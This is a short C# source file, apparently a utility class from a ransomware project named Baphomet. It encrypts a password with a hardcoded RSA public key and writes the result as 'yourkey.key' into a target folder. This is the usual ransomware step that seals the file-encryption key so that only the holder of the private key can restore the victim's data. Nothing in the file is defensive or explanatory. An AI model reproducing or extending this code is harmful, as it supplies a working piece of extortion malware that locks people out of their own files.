using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet.Utilities;

public class CryptRSA
{
	public void EncryptText(string targetPath, string password)
	{
		string xmlString = "<RSAKeyValue><Modulus>6CfrsR8sYoIZUvu/5SqWyysX+BwCNVEdWegu6JfO2I2f06bRpUSZ9fnz2SY88KuPHmhDlCDAngky74QdAFCz4h7ynjDrM2ac2Nb4kCeb9sE8PhLeW/sP03HF7Zd4E0j2aZrTe6amZKffebGPlcye1qn1muRL65iIAXc/vdJElgE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
		byte[] bytes = new UnicodeEncoding().GetBytes(password);
		byte[] bytes2;
		using (RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider())
		{
			rSACryptoServiceProvider.FromXmlString(xmlString);
			bytes2 = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false);
		}
		File.WriteAllBytes(targetPath + "\\yourkey.key", bytes2);
	}
}
